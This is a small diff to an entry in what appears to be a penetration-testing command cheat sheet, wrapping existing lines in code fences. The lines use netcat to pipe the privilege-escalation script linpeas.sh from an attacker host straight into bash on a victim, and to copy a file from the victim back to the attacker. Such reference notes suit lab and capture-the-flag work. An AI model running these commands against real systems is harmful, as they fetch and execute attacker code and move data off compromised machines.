@@ -6,10 +6,9 @@ description: |
 
   	File to copy: linpeas.sh
 
-    nc -lvnp 9001 < linpeas.sh (attacker) & nc 10.10.21.14 9001 | bash (victim)
+    ```nc -lvnp 9001 < linpeas.sh (attacker)``` & ```nc 10.10.21.14 9001 | bash (victim)```
 
-    nc 10.10.21.14 9001 < file.txt (victim) & nc -lvnp 9001 > file.txt (attacker)
-
+    ```nc 10.10.21.14 9001 < file.txt (victim)``` & ```nc -lvnp 9001 > file.txt (attacker)```
 
 command: |
   nc -lvnp 9001 < linpeas.sh
